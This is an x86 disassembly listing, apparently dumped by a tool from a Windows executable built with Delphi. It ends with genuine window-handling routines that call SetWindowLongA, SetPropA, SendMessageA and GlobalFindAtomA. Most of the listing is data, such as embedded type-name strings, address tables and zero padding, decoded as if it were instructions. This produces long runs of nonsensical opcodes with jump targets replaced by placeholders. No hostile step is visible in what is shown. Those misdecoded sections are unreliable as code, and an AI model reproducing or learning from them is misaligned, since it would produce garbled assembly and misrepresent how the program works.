add [ eax - 0x55 ] bh
inc ebx
add [ eax - 0x7e ] bl
inc esp
add [ esp + ebp * 4 - 0x5393ffbd ] cl
inc ebx
add [ esp + ebp * 4 - 0x5467ffbd ] ch
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ eax - 0x7e ] dh
inc esp
add [ ebx + ebp * 4 - 0x56d3ffbd ] bh
inc ebx
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ eax ] cl
add [ eax ] al
push [ eax - 0x58 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
add [ esi + ebp * 2 + 0x43 ] bh
je r-xdata
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
imul esp [ edi + 0x68 ] 0x436e7c74
imul esp [ gs : edi + 0x68 ] 0x436e7c74
add [ eax + eax ] cl
add bh bh
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
add ah ch
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc ebx
add eax 0x0
inc ebx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
inc ebx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
and al 0x6e
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax ] ah
outsb
inc ebx
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
outsb
add [ ecx ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add ah dh
adc [ eax ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
add [ esi ] al
push esp
dec edi
inc ebx
jb r-xdata
hlt
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
dec edi
jbe r-xdata
add [ eax ] cl
push cs
push esp
dec ebx
jns r-xdata
popad
outsb
add ah dh
adc [ eax ] al
add al 0x8
push es
push ebx
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
hlt
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
push 0xa8004010
cmovno eax [ eax ]
nop
clc
jo r-xdata
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ebp * 2 + 0x64080043 ] bh
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add al cl
insd
inc ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
hlt
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
inc esp
jb r-xdata
jbe r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x6d ] bh
inc ebx
add [ eax ] al
adc [ eax ] al
nop
mov esp 0x8004371
push cs
push esp
inc esp
jb r-xdata
outsb
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
add [ eax ] bl
push 0x72640043
inc ebx
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
inc esp
jb r-xdata
hlt
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
adc [ eax ] al
pop es
inc edx
outsd
outsd
insb
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x721c0040 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp + 0x71340040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
pop es
dec ecx
outsb
je r-xdata
inc esp
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add al al
jb r-xdata
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
sbb [ eax + 0x43 ] ch
add [ edx + esi * 2 + 0x43 ] ah
push ebx
outsb
add al 0x8
push es
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
hlt
hlt
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
inc esp
outsd
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
hlt
outsb
je r-xdata
jb r-xdata
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ edi ] eax
inc ebx
popad
je r-xdata
outsb
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
adc [ edx + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
cld
je r-xdata
outsb
je r-xdata
pop es
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
mov eax 0x7000436a
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
push edx
jae r-xdata
push es
inc ebx
jpe r-xdata
add eax 0x65530608
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jne r-xdata
or [ ebp + 0x6f ] cl
add ah dh
adc [ eax ] al
adc [ edx + 0x43 ] bh
add al ch
add [ ebx ] r-xdata
and al 0x74
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
mov eax 0x3c00436a
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + 0x6d ] bh
inc ebx
add [ eax ] al
adc [ eax ] al
nop
mov eax 0x8004373
or al 0x54
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4375fcc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x437684c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
insb
outsd
ja r-xdata
jbe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
add [ eax ] cl
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
test [ esi + 0x43 ] dh
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
outsb
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x779c0040 ] cl
inc ebx
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
jne r-xdata
inc ebp
js r-xdata
outsb
je r-xdata
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x78 ] al
inc ebx
js r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x4ff7ffbd ] bl
inc ebx
add [ edx + edi * 2 ] dl
inc ebx
add [ eax ] al
add ah ah
and [ ecx ] eax
pushad
fwait
inc ebp
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add al bh
iretd
add [ eax ] al
in al 0x21
inc ecx
push eax
outsd
jo r-xdata
add al 0x8
push es
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax - 0x33ffbe65 ] al
lodsb [ esi ]
inc ebx
add [ eax - 0x35 ] ch
inc ebx
add [ ebx + ecx * 8 + 0x43 ] ah
add [ esp + ecx * 8 ] dh
inc ebx
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esi + esi * 4 + 0x43 ] dl
add [ eax - 0x1fffbc4b ] bh
mov esi 0xae580043
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add [ esi + ecx * 8 + 0x43 ] ah
add [ eax ] ah
fild [ ebx ]
mov al [ 0x140043c0 ]
rol [ ebx ] 0x88
mov cl 0x43
add ah dh
rol [ ebx ] 0xe
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
inc ebx
add [ eax - 0x65 ] bh
add [ ecx + eax ] bl
add [ 0x66696853 ] al
je r-xdata
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
add [ esi ] al
jpe r-xdata
outsb
je r-xdata
add [ eax - 0x65 ] ah
jo r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
test al 0xf
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
lea eax [ eax ]
pushfd
ja r-xdata
jbe r-xdata
add [ ecx + edi * 4 - 0x6487ffbd ] dh
add [ ebp + ebp * 4 - 0x2327ffbd ] ah
inc ebx
add al dl
rol [ ebx ] 0x1
mov esp 0xa000413e
fadd [ ebx ]
pushfd
mov al 0x43
add [ eax ] cl
mov al 0x43
push eax
outsd
jae r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
test al 0xf
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
clc
jbe r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
js r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_437dff
rol [ esi + edi * 2 ] 0x43
add [ edi ] cl
or al 0x49
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
add [ eax - 0x68 ] ah
outsd
insb
jae r-xdata
inc ebx
add al ah
std
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x38004422 ] ah
in al 0x43
add ah cl
0xf86c0043 0x43
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
add [ eax ] al
add [ eax ] al
dec eax
jg r-xdata
add bh bh
inc [ eax + 0x437e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7f ] cl
inc ebx
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add ah ch
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
bound edi [ edi + 0x43 ]
add dl bl
add [ ebx ] 0x204
push eax
ja r-xdata
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax - 0x7ffbe65 ] al
loopne r-xdata
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ edi + edi * 8 + 0x43 ] al
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx ] bl
inc ebx
add ah ah
inc esp
add [ edi + esi * 8 ] cl
sub_43860c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
xchg [ ebx ] al
sub [ eax ] al
add [ eax ] al
mov al [ 0x54004010 ]
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_4386fc
fadd [ esi - 0x7919ffbd ]
inc ebx
add al dh
xchg [ ebx ] al
popad
xchg [ ebx ] al
imul eax [ esi - 0x798effbd ] 0x86790043
inc ebx
add [ esi - 0x6cffbc7a ] al
xchg [ ebx ] al
mov al [ 0xffffffffad004386 ]
xchg [ ebx ] al
mov edx 0xc7004386
xchg [ ebx ] al
aam 0x86
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffff86fce870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax + 0x34004387 ] ah
xchg [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_4387dc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x88
cwde
nop
js r-xdata
inc ebx
add al ah
std
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x38004422 ] ah
in al 0x43
add ah cl
0xf86c0043 0x43
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc esp
add [ edx + ebx * 2 + 0x44 ] dl
add [ eax + 0x5f ] bl
inc esp
add [ ebx * 2 + 0x48240044 ] cl
inc esp
add ah ch
push esi
inc esp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
inc ecx
add [ eax - 0x7ffbe65 ] al
loopne r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4389 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x77 ] ch
inc ebx
add [ eax ] cl
add al [ eax ]
add [ esi + edi * 2 ] dh
inc ebx
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ edi + edi * 8 + 0x43 ] al
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx ] bl
inc ebx
add ah ah
inc esp
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
add [ eax ] al
or [ ecx + 0x43 ] 0x0
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x54004010 ] ah
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + 0x6c ] al
inc esp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
mov eax eax
and al 0x88
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 ] ah
sub_4389c0
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_438a78
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_438aac
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40441c
push eax
call GlobalFindAtomA
